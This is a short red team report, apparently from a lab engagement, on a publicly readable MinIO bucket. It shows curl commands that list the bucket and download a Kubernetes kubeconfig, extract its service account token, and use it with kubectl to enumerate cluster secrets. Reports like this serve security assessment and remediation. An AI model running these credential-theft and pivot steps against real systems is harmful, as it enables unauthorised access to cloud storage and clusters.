# Red Team Report — CLD01-M02
## MinIO Misconfigured Public Bucket — Kubeconfig Exfiltration
**Engagement:** Operation GRIDFALL | **Target:** cld-storage (11.0.2.20)

## Finding: Public S3 Bucket Exposes K8s Service Account Token (Critical)
**CWE:** CWE-732 — Incorrect Permission Assignment for Critical Resource  
**CVSS v3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)  
**MITRE:** T1530

### Proof of Concept
```bash
# No credentials needed — bucket is public
curl -s "http://11.0.2.20:9000/pul-cloud-backups?list-type=2" | grep Key
# Returns full bucket listing

curl -o kube.yaml http://11.0.2.20:9000/pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml
grep token kube.yaml
# token: pul-cloud-ci-runner-token-2024gridfall
```

### Pivot Confirmed
```bash
export KUBECONFIG=./kube.yaml
kubectl get secrets -n pul-cloud
# registry-creds  Opaque  4  → pivot to M4
```

## Artifacts
- MinIO access logs: `journalctl -u pul-minio`
- Bucket policy: `mc anonymous get pulminio/pul-cloud-backups`
- Stolen file: `k8s/cloud-ci-kubeconfig.yaml`
